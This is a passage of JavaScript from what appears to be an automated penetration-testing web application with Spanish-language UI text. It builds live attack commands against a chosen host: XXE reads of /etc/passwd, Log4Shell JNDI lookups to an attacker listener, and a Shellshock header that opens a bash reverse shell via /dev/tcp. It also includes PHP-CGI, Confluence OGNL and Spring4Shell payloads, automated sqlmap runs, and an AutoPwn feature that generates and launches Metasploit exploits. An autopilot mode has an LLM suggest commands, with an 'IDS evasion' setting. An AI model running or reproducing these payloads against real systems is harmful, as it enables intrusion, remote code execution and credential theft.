                'for ep in /graphql /api/graphql /graphiql /v1/graphql /gql /query /api/query; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 -X POST -H "Content-Type: application/json" -d \'{"query":"{__typename}"}\' ' + url + '$ep); [ "$code" = "200" ] && echo "[GRAPHQL FOUND $code] ' + url + '$ep" && curl -sk -X POST -H "Content-Type: application/json" -d \'{"query":"{__schema{queryType{name}}}"}\' ' + url + '$ep | head -5; done',
                'echo "╔═══ XXE via Content-Type ═══╗"',
                'for ep in / /api/ /upload /xml /soap /ws; do out=$(curl -sk -X POST -H "Content-Type: application/xml" -d \'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>\' -m 5 ' + url + '$ep 2>/dev/null); echo "$out" | grep -q "root:" && echo "[XXE-FOUND] ' + url + '$ep" && echo "$out" | grep "root:" | head -2; done',
                'echo "╔═══ HTTP Request Smuggling (CL.TE / TE.CL) ═══╗"',
                '(python3 /opt/smuggler/smuggler.py -u ' + url + ' 2>/dev/null | head -30 || echo "smuggler.py not found — manual check required") || true',
                'echo "╔═══ JWT Token Analysis ═══╗"',
                'cookie=$(curl -sk -c /tmp/jwt_cookie_' + r.replace(/\./g,"_") + ' ' + url + ' -o /dev/null -D - 2>/dev/null | grep -i "set-cookie" | grep -i "jwt\\|token\\|auth" | head -3); echo "$cookie" | grep -q "." && echo "[JWT COOKIE] $cookie" || echo "[INFO] No JWT cookie on root path"',
                'echo "╔═══ Open Redirect ═══╗"',
                'for param in "redirect" "next" "url" "return" "returnTo" "continue" "goto"; do code=$(curl -sk -o /dev/null -w "%{http_code}" -L -m 5 "' + url + '?$param=https://evil.com"); [ "$code" = "200" ] && echo "[REDIRECT-POSSIBLE param=$param] might redirect to evil.com"; done',
                'echo "╔═══ HTTP Methods Allowed ═══╗"',
                'curl -sk -X OPTIONS -I ' + url + ' 2>/dev/null | grep -i "Allow:" | head -3',
                'echo "╔═══ CRLF Injection ═══╗"',
                'curl -sk -o /dev/null -D - -m 5 "' + url + '/%0d%0aSet-Cookie:crlftest=1" 2>/dev/null | grep -i "crlftest" && echo "[CRLF FOUND]" || echo "[CRLF] Not detected"',
            ].join('; ');
        },
    },
    // ══ Phase 13: IPMI / ICS / Obscure Services ══════════════════════════════
    {
        id: 'ipmi_ics_misc',
        label: 'IPMI / ICS / TFTP / Docker / Kubernetes',
        icon: 'fa-microchip',
        phase: 'exploitation',
        cmd: function(r) {
            return [
                'echo "╔═══ IPMI / BMC ═══╗"',
                '(sudo nmap -sU -p623 --script ipmi-version,ipmi-brute --script-args brute.firstonly=true ' + r + ' 2>&1 | head -30 || true)',
                'echo "╔═══ TFTP ═══╗"',
                '(nmap -sU -p69 --script tftp-enum ' + r + ' 2>&1 | head -20 || true)',
                'echo "╔═══ Docker API (2375/2376) ═══╗"',
                '(curl -sk --connect-timeout 5 http://' + r + ':2375/version 2>/dev/null | head -5 || true); (curl -sk --connect-timeout 5 http://' + r + ':2376/version 2>/dev/null | head -5 || true)',
                'echo "╔═══ Kubernetes API (6443/8080/10250) ═══╗"',
                '(curl -sk --connect-timeout 5 https://' + r + ':6443/version 2>/dev/null | head -5 || true); (curl -sk --connect-timeout 5 http://' + r + ':8080/version 2>/dev/null | head -5 || true); (curl -sk --connect-timeout 5 https://' + r + ':10250/pods 2>/dev/null | head -5 || true)',
                'echo "╔═══ ICS / SCADA (Modbus/BACnet/Siemens) ═══╗"',
                '(nmap -p102,502,47808 --script bacnet-info,s7-info,modbus-discover ' + r + ' 2>&1 | head -30 || true)',
                'echo "╔═══ Consul / etcd / Zookeeper ═══╗"',
                '(curl -sk --connect-timeout 5 http://' + r + ':8500/v1/agent/members 2>/dev/null | head -5 || true); (curl -sk --connect-timeout 5 http://' + r + ':2379/v2/keys 2>/dev/null | head -5 || true)',
                'echo "╔═══ ProFTPD / Apache / IIS Headers ═══╗"',
                '(nmap -p21,80,443,8080 --script banner ' + r + ' 2>&1 | grep -v "^$" | head -25 || true)',
                'echo "╔═══ RDP NLA check (3389) ═══╗"',
                '(nmap -p3389 --script rdp-enum-encryption ' + r + ' 2>&1 | head -20 || true)',
                'echo "╔═══ WS-Management / WinRM (5985/5986) ═══╗"',
                '(curl -sk --connect-timeout 5 http://' + r + ':5985/wsman 2>/dev/null | head -5 || true)',
                'echo "╔═══ LDAP anonymous bind ═══╗"',
                '(nmap -p389,636,3268,3269 --script ldap-rootdse,ldap-search --script-args ldap.base="" ' + r + ' 2>&1 | head -40 || true)',
            ].join('; ');
        },
    },
    // ══ Phase 14: Direct Exploit Attempts (no MSF) ════════════════════════════
    {
        id: 'direct_exploits',
        label: 'Direct Exploit Attempts (vsftpd/Redis/EternalBlue/Log4j)',
        icon: 'fa-bolt',
        phase: 'exploitation',
        cmd: function(r) {
            var lhost = (typeof state !== 'undefined' && state.globalVars && state.globalVars.lhost) ? state.globalVars.lhost : '10.10.14.1';
            var lport = (typeof state !== 'undefined' && state.globalVars && state.globalVars.lport) ? state.globalVars.lport : '4444';
            var cmds = ['echo "╔═══ DIRECT EXPLOIT ATTEMPTS ═══╗"'];
            var ports = _fullReconPorts.map(function(p){ return p.port; });
            cmds.push('echo "── EternalBlue quick check ──" && (python3 /opt/MS17-010/checker.py ' + r + ' 2>/dev/null | head -10 || echo "[!] checker.py not found")');
            if (ports.indexOf(21) !== -1) {
                cmds.push('echo "── vsftpd 2.3.4 backdoor ──" && (nmap -p21 --script ftp-vsftpd-backdoor ' + r + ' 2>&1 | head -15 || true)');
            }
            if (ports.indexOf(6379) !== -1) {
                cmds.push('echo "── Redis RCE via cron ──" && redis-cli -h ' + r + ' -p 6379 --no-auth-warning INFO server 2>&1 | grep -E "redis_version|os:|tcp_port" | head -5 || true');
                cmds.push('echo "── Redis: set authorized_keys ──" && (redis-cli -h ' + r + ' -p 6379 --no-auth-warning CONFIG GET dir 2>&1 | head -4 || true)');
            }
            cmds.push('echo "── Log4Shell probe (jndi) ──" && curl -sk -H "X-Api-Version: \\${jndi:ldap://' + lhost + ':1389/exploit}" -m 5 http://' + r + '/ 2>&1 | head -5 || true; curl -sk -H "User-Agent: \\${jndi:ldap://' + lhost + ':1389/exploit}" -m 5 http://' + r + '/ 2>&1 | head -5 || true');
            cmds.push('echo "── Spring4Shell probe ──" && curl -sk -X POST "http://' + r + '/?" -H "Content-Type: application/x-www-form-urlencoded" -d "class.module.classLoader.URLs[0]=0" -m 5 2>&1 | head -5 || true');
            cmds.push('echo "── Shellshock probe ──" && curl -sk -H "User-Agent: () { :;}; echo Content-Type: text/plain; echo; echo shellshock" "http://' + r + '/cgi-bin/test.cgi" -m 5 2>&1 | head -10 || true; curl -sk -A "() { :;}; /bin/bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1" "http://' + r + '/cgi-bin/" -m 5 2>/dev/null | head -5 || true');
            cmds.push('echo "── PHP CGI RCE (CVE-2012-1823) ──" && curl -sk "http://' + r + '/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input" -X POST -d "<?php system(id); ?>" -m 5 2>&1 | head -10 || true');
            cmds.push('echo "── Drupalgeddon2 (CVE-2018-7600) ──" && (nuclei -u http://' + r + ' -t cves/2018/CVE-2018-7600.yaml -silent 2>/dev/null | head -10 || true)');
            cmds.push('echo "── Confluence OGNL (CVE-2022-26134) ──" && curl -sk -H "Content-Type: application/x-www-form-urlencoded" "http://' + r + '/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/" -m 5 2>&1 | head -10 || true');
            return cmds.join('; ');
        },
    },
    // ══ Phase 15: SQLMap auto-test on parameterized URLs ════════════════════
    {
        id: 'sqlmap_auto',
        label: 'SQLMap Auto-Test (params from GAU + crawl)',
        icon: 'fa-database',
        phase: 'web_attacks',
        condition: function(ports) { return ports.some(function(p){ return [80,443,8080,8443,8000,3000].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,3000].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var url = 'http://' + r + ':' + port;
            return [
                'echo "╔═══ SQLMAP — Gathering URLs with params ═══╗"',
                'echo "' + url + '" > /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt',
                'gau ' + r + ' 2>/dev/null | grep "=" | head -50 >> /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt || true',
                'hakrawler -url ' + url + ' -depth 2 -insecure 2>/dev/null | grep "=" | head -30 >> /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt || true',
                'sort -u /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt -o /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt',
                'URLCOUNT=$(wc -l < /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt); echo "[INFO] Testing $URLCOUNT URLs for SQLi"',
                'echo "╔═══ SQLMAP — Testing URLs (forms + GET params) ═══╗"',
                'sqlmap -m /tmp/sqlmap_target_' + r.replace(/\./g,"_") + '.txt --batch --level=3 --risk=2 --random-agent --forms --crawl=2 --timeout=10 --retries=1 --threads=3 --dbs --output-dir=/tmp/sqlmap_' + r.replace(/\./g,"_") + ' 2>&1 | grep -E "\\[INFO\\]|\\[WARNING\\]|\\[CRITICAL\\]|\\[ERROR\\]|parameter|injectable|database|Table" | head -100 || true',
                'echo "╔═══ SQLMAP — Login forms (auth bypass) ═══╗"',
                'for loginpath in /login /admin /signin /auth /user/login /account/login; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 ' + url + '$loginpath); [ "$code" = "200" ] && sqlmap -u ' + url + '$loginpath --batch --forms --level=2 --risk=1 --random-agent --auth-type=FORM --output-dir=/tmp/sqlmap_login_' + r.replace(/\./g,"_") + ' 2>&1 | grep -E "injectable|parameter" | head -10 || true; done',
            ].join('; ');
        },
    },
];

var _fullReconCurrentStep = 0;
var _fullReconJobMap      = {};
var _fullReconPorts       = [];
var _fullReconStepES      = null;   // dedicated EventSource per step

async function startFullRecon() {
    if (!state.activeProject) { toast('Selecciona un proyecto primero', 'error'); return; }
    var rhost = state.globalVars.rhost || (state.activeProject.targets || [])[0] || '';
    if (!rhost) { toast('Configura RHOST en las vars globales', 'error'); return; }

    if (state.fullReconActive) {
        if (!confirm('Ya hay un Full Recon activo. Reiniciar?')) return;
        cancelFullRecon();
    }

    state.fullReconActive  = true;
    _fullReconCurrentStep  = 0;
    _fullReconJobMap       = {};
    _fullReconPorts        = [];
    state._lastAutoParseResult = null;

    await loadPhase('dashboard');
    toast('Rocket Full Recon iniciado para ' + rhost, 'info');
    _runNextReconStep();
}

async function _runNextReconStep() {
    if (!state.fullReconActive) return;

    // Skip steps whose condition is not met (only after the first 2 nmap steps)
    while (_fullReconCurrentStep < FULL_RECON_STEPS.length) {
        var step = FULL_RECON_STEPS[_fullReconCurrentStep];
        if (step.condition && _fullReconCurrentStep >= 2 && !step.condition(_fullReconPorts)) {
            _fullReconJobMap[step.id] = 'skipped';
            _fullReconCurrentStep++;
            _renderReconStepper();
        } else {
            break;
        }
    }

    if (_fullReconCurrentStep >= FULL_RECON_STEPS.length) {
        _fullReconFinish();
        return;
    }

    var step   = FULL_RECON_STEPS[_fullReconCurrentStep];
    var rhost  = state.globalVars.rhost || (state.activeProject.targets || [])[0] || '';
    var domain = state.globalVars.domain || '';
    var cmd    = step.cmd(rhost, domain);

    _renderReconStepper();

    var res = await fetch('/api/run', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, tool: step.label, phase: step.phase, project_id: state.activeProject.id }),
    });
    var data = await res.json();
    if (!data.job_id) { _fullReconJobDone(null, 'error'); return; }
    _fullReconJobMap[step.id] = data.job_id;
    await refreshJobsList();
    _renderReconStepper();

    // Open dedicated SSE to track this step's completion automatically
    var stepJobId = data.job_id;
    if (_fullReconStepES) { _fullReconStepES.close(); _fullReconStepES = null; }
    _fullReconStepES = new EventSource('/api/jobs/' + stepJobId + '/stream?offset=0');
    _fullReconStepES.onmessage = function(e) {
        if (!JOBS_OUTPUT_CACHE[stepJobId]) JOBS_OUTPUT_CACHE[stepJobId] = [];
        JOBS_OUTPUT_CACHE[stepJobId].push(e.data);
        if (state.selectedJobId === stepJobId) appendTermLine(e.data);
    };
    _fullReconStepES.addEventListener('done', async function(ev) {
        if (_fullReconStepES) { _fullReconStepES.close(); _fullReconStepES = null; }
        await refreshJobsList();
        if (state.activeProject) await _autoParseAndSave(stepJobId);
        _fullReconJobDone(stepJobId, ev.data || 'ok');
    });
    _fullReconStepES.onerror = async function() {
        if (_fullReconStepES) { _fullReconStepES.close(); _fullReconStepES = null; }
        await _fullReconPollFallback(stepJobId);
    };
}

async function _fullReconJobDone(jobId, status) {
    if (_fullReconCurrentStep >= FULL_RECON_STEPS.length) return;
    var step = FULL_RECON_STEPS[_fullReconCurrentStep];
    if (!step || _fullReconJobMap[step.id] !== jobId) return;

    // Mark error state if job failed
    if (status === 'error') {
        _fullReconJobMap[step.id + '_status'] = 'error';
        _renderReconStepper();
    }

    // Fetch updated ports
    try {
        var pr = await fetch('/api/projects/' + state.activeProject.id + '/ports');
        _fullReconPorts = await pr.json();
    } catch(e) {}

    _fullReconCurrentStep++;
    _renderReconStepper();

    // Refresh dashboard stats
    if (state.activePhase === 'dashboard') {
        setTimeout(loadDashboard, 500);
    }

    setTimeout(_runNextReconStep, 1200);
}

function _renderReconStepper() {
    var el = document.getElementById('recon-steps');
    if (!el) return;
    el.innerHTML = FULL_RECON_STEPS.map(function(step, i) {
        var cls  = 'step-wait';
        var icon = 'fa-circle';
        var jobId = _fullReconJobMap[step.id];
        if (jobId === 'skipped') {
            cls = 'step-wait'; icon = 'fa-forward-fast';
        } else if (_fullReconJobMap[step.id + '_status'] === 'error') {
            cls = 'step-error'; icon = 'fa-circle-xmark';
        } else if (i < _fullReconCurrentStep) {
            cls = 'step-done'; icon = 'fa-circle-check';
        } else if (i === _fullReconCurrentStep && state.fullReconActive) {
            cls = 'step-active'; icon = 'fa-spinner fa-spin';
        }
        var skipLabel = jobId === 'skipped' ? ' <small style="opacity:.5">(skip)</small>' : '';
        return '<div class="recon-step ' + cls + '"><i class="fas ' + icon + '"></i> ' + h(step.label) + skipLabel + '</div>';
    }).join('');
    document.getElementById('full-recon-stepper').classList.remove('d-none');
}

async function _fullReconFinish() {
    state.fullReconActive = false;
    _renderReconStepper();
    toast('Full Recon completado - analizando vulnerabilidades...', 'success');

    // Auto-generate AutoPwn script and notify about detected exploits
    if (state.activeProject && state.globalVars.rhost) {
        try {
            var apRes = await fetch('/api/projects/' + state.activeProject.id + '/autopwn/generate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    rhost: state.globalVars.rhost,
                    lhost: state.globalVars.lhost || '',
                    lport: parseInt(state.globalVars.lport || '4444'),
                }),
            });
            if (apRes.ok) {
                var apData = await apRes.json();
                _autoPwnRcPath = apData.path || null;
                if (apData.exploits > 0) {
                    toast('AUTOPWN: ' + apData.exploits + ' exploits + ' + apData.scanners + ' scanners generados! Ve al tab Autopilot.', 'danger');
                } else if (apData.scanners > 0) {
                    toast('AutoPwn: ' + apData.scanners + ' scanners listos. Ve al tab Autopilot.', 'warning');
                }
                // Refresh autopwn UI if visible
                if (state.activePhase === 'autopilot') {
                    document.getElementById('apwn-exploits').textContent = apData.exploits;
                    document.getElementById('apwn-scanners').textContent = apData.scanners;
                    document.getElementById('apwn-rhost').textContent = apData.rhost;
                    document.getElementById('autopwn-stats').classList.remove('d-none');
                    if (apData.script) {
                        document.getElementById('autopwn-script-content').textContent = apData.script;
                        document.getElementById('autopwn-script-wrap').classList.remove('d-none');
                        document.getElementById('autopwn-run-btn').classList.remove('d-none');
                    }
                }
            }
        } catch(e) { console.error('AutoPwn auto-generate error:', e); }
    }

    setTimeout(async function() {
        try {
            var res  = await fetch('/api/projects/' + state.activeProject.id + '/report');
            var html = await res.text();
            var blob = new Blob([html], { type: 'text/html' });
            var url  = URL.createObjectURL(blob);
            var a    = document.createElement('a');
            a.href = url;
            a.download = state.activeProject.name.replace(/ /g, '_') + '_auto_report.html';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            toast('Report generado automaticamente', 'success');
        } catch(e) { console.error(e); }
        if (state.activePhase === 'dashboard') loadDashboard();
    }, 2000);
}

function cancelFullRecon() {
    state.fullReconActive = false;
    if (_fullReconStepES) { _fullReconStepES.close(); _fullReconStepES = null; }
    var step  = FULL_RECON_STEPS[_fullReconCurrentStep];
    var jobId = step && _fullReconJobMap[step.id];
    if (jobId && jobId !== 'skipped') {
        fetch('/api/jobs/' + jobId + '/stop', { method: 'POST' });
    }
    _renderReconStepper();
    toast('Full Recon cancelado', 'info');
}

async function _fullReconPollFallback(jobId) {
    // Fallback: poll job status if SSE fails (e.g., network hiccup)
    var attempts = 0;
    var maxAttempts = 180; // 3 min max at 1s intervals
    var poll = setInterval(async function() {
        if (!state.fullReconActive || attempts++ > maxAttempts) {
            clearInterval(poll);
            _fullReconJobDone(jobId, 'error');
            return;
        }
        try {
            var r = await fetch('/api/jobs/' + jobId);
            var d = await r.json();
            if (d.status === 'done' || d.status === 'error' || d.status === 'stopped') {
                clearInterval(poll);
                if (state.activeProject) await _autoParseAndSave(jobId);
                _fullReconJobDone(jobId, d.status);
            }
        } catch(e) {}
    }, 1000);
}


// ══════════════════════════════════════════════════════════════════════════════
//  AUTONOMOUS PENTEST ENGINE (AUTOPILOT)
// ══════════════════════════════════════════════════════════════════════════════

const AP = {
    mode: 'normal',
    sseLog: null,
    sseLogOffset: 0,
    statusPoll: null,
    timerInterval: null,
    startedAt: null,
    ganttChart: null,
    xtermLeft: null,
    xtermRight: null,
    xtermFitLeft: null,
    xtermFitRight: null,
    splitJobIds: [null, null],
};

const AP_MODE_INFO = {
    stealth:    'Timing T1 · max-rate 100 · top-1000 ports\nSin brute force · delay 10s entre jobs\nIdeal para IDS evasion',
    normal:     'Timing T3 · min-rate 1000 · todos los puertos\nBrute force activado · delay 2s\nEquilibrio velocidad/sigilo',
    aggressive: 'Timing T4 · min-rate 5000 · todos los puertos\nBrute force + Nuclei + vhosts\nAI (Ollama) sugiere comandos · sin delay',
};

// ── AutoPwn Engine ──────────────────────────────────────────────────────────

let _autoPwnRcPath = null;

async function autoPwnGenerate() {
    if (!state.activeProject) { toast('Selecciona un proyecto primero', 'error'); return; }
    const btn = document.querySelector('.autopwn-panel .btn-outline-warning');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generando...';

    const lhost = state.globalVars.lhost || '10.10.14.1';
    const lport = state.globalVars.lport || '4444';
    const rhost = state.globalVars.rhost || (state.activeProject.targets || [])[0] || '';

    if (!rhost) {
        toast('Configura RHOST en las vars globales', 'error');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> Generar RC Script';
        return;
    }

    const res = await fetch(`/api/projects/${state.activeProject.id}/autopwn/generate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rhost, lhost, lport: parseInt(lport) }),
    });
    const data = await res.json();
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> Generar RC Script';

    if (data.error) { toast(data.error, 'error'); return; }

    _autoPwnRcPath = data.path;

    // Update stats
    document.getElementById('apwn-exploits').textContent  = data.exploits;
    document.getElementById('apwn-scanners').textContent  = data.scanners;
    document.getElementById('apwn-rhost').textContent     = data.rhost;
    document.getElementById('apwn-lhost').textContent     = data.lhost;
    document.getElementById('apwn-lport').textContent     = data.lport;
    document.getElementById('autopwn-rc-path').textContent  = data.path || '(no guardado)';
    document.getElementById('autopwn-rc-path2').textContent = data.path || '';
    document.getElementById('autopwn-script-content').textContent = data.script;

    document.getElementById('autopwn-stats').classList.remove('d-none');
    document.getElementById('autopwn-script-wrap').classList.remove('d-none');
    document.getElementById('autopwn-guide').classList.add('d-none');

    if (data.path) {
        document.getElementById('autopwn-run-btn').classList.remove('d-none');
    }

    const total = data.exploits + data.scanners;
    toast(`Script generado: ${data.exploits} exploits + ${data.scanners} scanners (${total} módulos MSF)`, 'success');
}

async function autoPwnRun() {
    if (!_autoPwnRcPath) { toast('Genera el script primero', 'error'); return; }
    if (!confirm(`ATENCIÓN: Esto ejecutará Metasploit contra ${state.globalVars.rhost}.\n\n¿Confirmas que tienes autorización?`)) return;

    const res = await fetch(`/api/projects/${state.activeProject.id}/autopwn/run`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rc_path: _autoPwnRcPath }),
    });
    const data = await res.json();
    if (data.error) { toast(data.error, 'error'); return; }

    toast('AutoPwn MSF iniciado — job ' + data.job_id.slice(0,8) + '...', 'success');
    await refreshJobsList();
    // Switch to terminal and show the job
    await loadPhase('terminal');
    setTimeout(() => selectJob(data.job_id), 500);
}

function autoPwnCopyScript() {
    const content = document.getElementById('autopwn-script-content');
    if (!content || !content.textContent) { toast('Genera el script primero', 'error'); return; }
    navigator.clipboard.writeText(content.textContent).then(() => toast('RC script copiado', 'success'));
}

function loadAutopilot() {
    if (!state.activeProject) return;
    _apInitXterms();
    _apRenderModeInfo();
    apRefreshStatus();
}

function apSetMode(mode) {
    AP.mode = mode;
    document.querySelectorAll('.ap-mode-btn').forEach(b => {
        b.classList.toggle('active', b.dataset.mode === mode);
    });
    _apRenderModeInfo();
}

function apToggleConfig() {
    const panel = document.getElementById('ap-config-panel');
    panel.classList.toggle('d-none');
}

function _apRenderModeInfo() {
    const el = document.getElementById('ap-mode-info');
    if (el) el.innerHTML = h(AP_MODE_INFO[AP.mode] || '').replace(/\n/g, '<br>');
}

async function apStart() {
    if (!state.activeProject) { toast('Selecciona un proyecto', 'error'); return; }

    const extraTargetsEl = document.getElementById('ap-extra-targets');
    const rawTargets = (extraTargetsEl?.value || '').trim();
    let targets = rawTargets
        ? rawTargets.split(/[\n,]+/).map(t => t.trim()).filter(Boolean)
        : (state.activeProject.targets || []);

    if (!targets.length) {
        toast('No hay targets. Define targets en el proyecto o en Config.', 'error');
        return;
    }

    const ollamaModel = document.getElementById('ap-ollama-model')?.value || 'llama3';
    const livingInterval = parseInt(document.getElementById('ap-living-interval')?.value || '300');
    const anthropicKey = document.getElementById('ap-anthropic-key')?.value || '';
    const lhost = (document.getElementById('ap-lhost')?.value || '').trim();
    const lport = document.getElementById('ap-lport')?.value || '4444';

    if (anthropicKey) {
        await fetch('/api/config/anthropic-key', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ key: anthropicKey }),
        }).catch(() => {});
    }

    const res = await fetch(`/api/projects/${state.activeProject.id}/autopilot/start`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: AP.mode, targets, ollama_model: ollamaModel, living_interval: livingInterval, lhost, lport }),
    });
    const data = await res.json();
    if (data.error) { toast(data.error, 'error'); return; }

    toast(`Autopiloto iniciado (${AP.mode}) contra ${targets.length} target(s)`, 'success');
    document.getElementById('ap-start-btn').classList.add('d-none');
    document.getElementById('ap-stop-btn').classList.remove('d-none');

    AP.startedAt = new Date();
    _apStartTimer();
    _apStartSSELog();
    _apStartStatusPoll();
}

async function apStop() {
    if (!state.activeProject) return;
    await fetch(`/api/projects/${state.activeProject.id}/autopilot/stop`, { method: 'POST' });
    toast('Deteniendo autopiloto...', 'info');
    document.getElementById('ap-stop-btn').classList.add('d-none');
    document.getElementById('ap-start-btn').classList.remove('d-none');
    _apStopAll();
}

function apOpenLivingReport() {
    if (!state.activeProject) return;
    window.open(`/api/projects/${state.activeProject.id}/autopilot/living_report`, '_blank');
}

// ── Timer ──────────────────────────────────────────────────────────────────

function _apStartTimer() {
    if (AP.timerInterval) clearInterval(AP.timerInterval);
    AP.timerInterval = setInterval(() => {
        if (!AP.startedAt) return;
        const elapsed = Math.floor((Date.now() - AP.startedAt) / 1000);
        const h2 = String(Math.floor(elapsed / 3600)).padStart(2, '0');
        const m2 = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
        const s2 = String(elapsed % 60).padStart(2, '0');
        const el = document.getElementById('ap-timer');
        if (el) el.textContent = `${h2}:${m2}:${s2}`;
    }, 1000);
}

// ── SSE Brain Log ─────────────────────────────────────────────────────────

function _apStartSSELog() {
    if (AP.sseLog) { AP.sseLog.close(); AP.sseLog = null; }
    AP.sseLog = new EventSource(`/api/projects/${state.activeProject.id}/autopilot/log/stream`);
    AP.sseLog.onmessage = (e) => {
        let line = e.data;
        try { line = JSON.parse(e.data); } catch {}
        _apAppendBrainLog(typeof line === 'string' ? line : JSON.stringify(line));
    };
    AP.sseLog.addEventListener('done', () => {
        AP.sseLog?.close(); AP.sseLog = null;
        document.getElementById('ap-stop-btn').classList.add('d-none');
        document.getElementById('ap-start-btn').classList.remove('d-none');
        _apStopAll();
        toast('Autopiloto finalizado', 'success');
    });
}

function _apAppendBrainLog(line) {
    const el = document.getElementById('ap-brain-log');
    if (!el) return;

    const tag = (line.split('] ')[1]?.split(' ')[0] || '').toLowerCase();
    const lineUp = line.toUpperCase();

    // Priority coloring: FOUND/REACT/EXPLOIT get special highlight
    let cls = '';
    if (['found'].includes(tag))                       cls = 'log-found';
    else if (['react','exploit','eternalblue'].some(t => tag.startsWith(t))) cls = 'log-react';
    else if (['impacket','secretsdump','psexec','wmiexec'].some(t => tag.startsWith(t))) cls = 'log-impacket';
    else if (tag === 'engine')   cls = 'log-engine';
    else if (tag === 'scan')     cls = 'log-scan';
    else if (tag === 'ports')    cls = 'log-ports';
    else if (tag === 'queue')    cls = 'log-queue';
    else if (tag === 'exec')     cls = 'log-exec';
    else if (tag === 'loot')     cls = 'log-loot';
    else if (tag === 'cred-reuse' || tag === 'cred') cls = 'log-cred';
    else if (tag === 'report')   cls = 'log-report';
    else if (tag === 'ai')       cls = 'log-ai';
    else if (tag === 'warn')     cls = 'log-warn';
    else if (['sweep','osint'].includes(tag)) cls = 'log-sweep';
    else if (tag === 'pivot')    cls = 'log-cred';
    else if (tag === 'timeout')  cls = 'log-warn';
    else                         cls = 'log-info';

    const div = document.createElement('div');
    div.className = `ap-log-line ${cls}`;
    // Icon prefix for key events
    let prefix = '';
    if (cls === 'log-found')    prefix = '🔴 ';
    else if (cls === 'log-react') prefix = '⚡ ';
    else if (cls === 'log-impacket') prefix = '🟣 ';
    div.textContent = prefix + line;
    el.appendChild(div);
    el.scrollTop = el.scrollHeight;

    const cnt = document.getElementById('ap-log-count');
    if (cnt) cnt.textContent = `${el.children.length} líneas`;

    // Update phase bar from accumulated log lines
    const allLines = Array.from(el.children).map(c => c.textContent);
    _apUpdatePhase(allLines);
}

// ── Status Poll ────────────────────────────────────────────────────────────

function _apStartStatusPoll() {
    if (AP.statusPoll) clearInterval(AP.statusPoll);
    AP.statusPoll = setInterval(apRefreshStatus, 3000);
}

async function apRefreshStatus() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/autopilot/status`);
    const data = await res.json();
    _apUpdateStats(data);
    if (data.timeline?.length) _apUpdateGantt(data.timeline);
    if (data.heatmap) _apUpdateHeatmap(data.heatmap);
    _apUpdateJobList(data);
    _apFetchLiveFindings();

    const badge = document.getElementById('ap-status-badge');
    if (badge) {
        if (data.running) {
            badge.className = 'badge bg-success ap-running-pulse';
            badge.textContent = `Modo: ${data.mode}`;
        } else {
            badge.className = 'badge bg-secondary';
            badge.textContent = 'Inactivo';
        }
    }

    if (data.running) {
        document.getElementById('ap-start-btn').classList.add('d-none');
        document.getElementById('ap-stop-btn').classList.remove('d-none');
        if (!AP.startedAt && data.started_at) {
            AP.startedAt = new Date(data.started_at);
            _apStartTimer();
        }
        if (!AP.sseLog) _apStartSSELog();
    }
}

function _apUpdateStats(data) {
    const stats = data.stats || {};
    _setText('ap-stat-cmds',      stats.commands_run      ?? 0);
    _setText('ap-stat-ports',     stats.ports_discovered  ?? 0);
    _setText('ap-stat-creds',     stats.creds_found       ?? 0);
    _setText('ap-stat-loot',      stats.loot_items        ?? 0);
    _setText('ap-stat-findings',  stats.findings_count    ?? 0);
    _setText('ap-stat-queue',     data.queue_size         ?? 0);
    _setText('ap-stat-mem-hosts', data.memory?.known_hosts ?? 0);
    _setText('ap-stat-pivots',    data.memory?.pivot_networks ?? 0);
}

async function _apFetchLiveFindings() {
    if (!state.activeProject) return;
    try {
        const res = await fetch(`/api/projects/${state.activeProject.id}/findings`);
        if (!res.ok) return;
        const findings = await res.json();
        _apUpdateLiveFindings(findings);
        // Update severity pills in stats bar
        const counts = {critical:0, high:0, medium:0, low:0};
        findings.forEach(f => { if (counts[f.severity] !== undefined) counts[f.severity]++; });
        const pills = document.getElementById('ap-sev-pills');
        if (pills) {
            pills.innerHTML = [
                counts.critical ? `<span class="badge bg-danger">${counts.critical}C</span>` : '',
                counts.high     ? `<span class="badge bg-warning text-dark">${counts.high}H</span>` : '',
                counts.medium   ? `<span class="badge bg-info text-dark">${counts.medium}M</span>` : '',
                counts.low      ? `<span class="badge bg-secondary">${counts.low}L</span>` : '',
            ].join('');
        }
        const cnt = document.getElementById('ap-live-findings-count');
        if (cnt) { cnt.textContent = findings.length; cnt.className = findings.length > 0 ? 'badge bg-danger ms-1' : 'badge bg-secondary ms-1'; }
    } catch(e) {}
}

function _apUpdateLiveFindings(findings) {
    const el = document.getElementById('ap-live-findings');
    if (!el) return;
    const SEV_COLOR = {critical:'#f85149', high:'#f0883e', medium:'#d29922', low:'#58a6ff', info:'#8b949e'};
